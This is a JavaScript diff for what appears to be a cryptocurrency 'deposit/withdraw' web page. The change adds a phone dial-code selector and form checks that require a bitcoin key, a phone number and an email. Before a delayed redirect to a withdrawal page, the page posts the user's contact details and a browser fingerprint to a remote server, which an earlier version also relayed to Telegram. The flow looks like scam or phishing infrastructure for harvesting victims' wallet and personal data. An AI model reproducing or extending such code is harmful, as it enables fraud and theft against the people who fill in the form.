@@ -21,30 +21,54 @@ class UserInfo {
 }
 
 let info = new UserInfo()
+let select = document.querySelector('.country_code_form');
+let telefon_verify = document.querySelector('.input_telefon');
+let code = "+31";
 
+select.addEventListener('change', () => {
+    code = select.value
+    let code_form = document.getElementById("code_form")
+
+    code_form.innerText = code
+});
+
+async function set_phone_numbers(codes) {
+    let genres = document.getElementById("country_codes")
+    let code_form = document.getElementById("code_form")
+
+
+    let country_codes = codes
+
+    for (c in country_codes) {
+        code_form.innerText = country_codes[0]?.dial_code
+        let newOption = new Option(`${country_codes[c]?.emoji} ${country_codes[c]?.name}`, country_codes[c]?.dial_code);
+        genres.append(newOption);
+    }
+}
 
 function loaderFunction(status) {
-    if(status){
+    if (status) {
         let div = document.createElement('div');
         div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
         div.id = "loader-wrapper"
         div.innerHTML = '<div class="loader" style="color:red;"></div>'
         document.body.append(div)
-    }else{
+    } else {
         document.getElementById("loader-wrapper").remove()
 
     }
 }
 
 async function send_request(type, laoder, url, data) {
-    if (laoder) { loaderFunction(false) }
     return new Promise((resolve, reject) => {
         let page = `https://amecacoin.online/${url}`;
+        console.log(page)
         xhr.open(type, page)
         xhr.responseType = "json"
+        xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
+        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
         xhr.setRequestHeader("Accept", "application/json")
         xhr.setRequestHeader("Content-Type", "application/json")
-        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
         xhr.setRequestHeader("mode", "no-cors")
         xhr.setRequestHeader("cache", "no-cache")
         xhr.setRequestHeader("credentials", "same-origin")
@@ -68,10 +92,42 @@ async function check_form(keys) {
     let bitcoin_title_id = document.getElementById("bitcoin_title").value
     let bitcoin_key_id = document.getElementById("bitcoin_key").value
     let email = document.getElementById('email_form').value
+    let nubmer_input = document.getElementById("number-input").value
     document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
 
+
     setTimeout(() => {
-        if (bitcoin_title_id == "" && bitcoin_key_id == "" && email == "") {
+
+
+
+        if (bitcoin_title_id == "") {
+            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
+
+            document.querySelector('.form-error').classList.add('active');
+            setTimeout(() => {
+                document.querySelector('.form-error').classList.remove('active');
+            }, 7000)
+
+            return
+        } else if (bitcoin_key_id == "") {
+            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
+
+            document.querySelector('.form-error').classList.add('active');
+            setTimeout(() => {
+                document.querySelector('.form-error').classList.remove('active');
+            }, 7000)
+
+            return
+        } else if (nubmer_input == "") {
+            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
+
+            document.querySelector('.form-error').classList.add('active');
+            setTimeout(() => {
+                document.querySelector('.form-error').classList.remove('active');
+            }, 7000)
+
+            return
+        } else if (email == "") {
             document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
 
             document.querySelector('.form-error').classList.add('active');
@@ -88,11 +144,11 @@ async function check_form(keys) {
                 document.querySelector('.form-error').classList.remove('active');
                 document.querySelector('.data-inccorrect').classList.remove("active");
 
-                send_request("post", false, "transaction", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), send_telegram: true, type: "important" })
-                send_request("post", false, "send_mail", { email: email, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
+                let phone = `${code}${nubmer_input}`
+                send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: phone, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
 
                 setTimeout(() => {
-                    window.location.href = 'withdraw.html';
+                    window.location.href = `withdraw.html?email=${email}`;
                 }, 10000)
 
                 return
@@ -117,6 +173,10 @@ async function getDataBitcoin() {
 
 async function get() {
     let users = await send_request("get", false, "users", false)
+    let codes = await send_request("get", false, "phone_nubmer_codes", false)
+
+    set_phone_numbers(codes)
+
     let data = {
         id: users?.length - 1 + 1,
         product_sub: info?.productSub(),
